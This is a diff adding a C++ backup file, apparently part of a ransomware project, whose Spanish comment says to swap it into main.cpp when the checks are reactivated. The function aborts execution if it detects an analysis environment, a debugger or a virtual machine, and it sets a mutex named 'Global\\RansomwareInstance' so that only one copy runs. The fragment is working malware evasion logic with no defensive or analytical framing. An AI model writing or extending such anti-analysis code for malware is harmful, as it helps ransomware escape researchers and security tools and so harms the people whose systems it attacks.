@@ -1,0 +1,37 @@
+// ============================================================
+// security_checks_full.cpp.bak
+// Reemplazar la función PerformSecurityChecks() en main.cpp
+// cuando se reactiven los checks.
+// ============================================================
+
+bool PerformSecurityChecks() {
+    g_logger->Log("Performing security checks");
+    
+    // Check if running in analysis environment
+    if (g_antiAnalysis && g_antiAnalysis->IsAnalysisEnvironment()) {
+        g_logger->Log("Analysis environment detected, aborting");
+        return false;
+    }
+    
+    // Check for debuggers
+    if (IsDebuggerPresent()) {
+        g_logger->Log("Debugger detected, aborting");
+        return false;
+    }
+    
+    // Check for virtual machines
+    if (g_antiAnalysis && g_antiAnalysis->IsVirtualMachine()) {
+        g_logger->Log("Virtual machine detected, aborting");
+        return false;
+    }
+    
+    // Check if already running
+    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\RansomwareInstance");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        g_logger->Log("Instance already running, exiting");
+        return false;
+    }
+    
+    g_logger->Log("Security checks passed");
+    return true;
+}
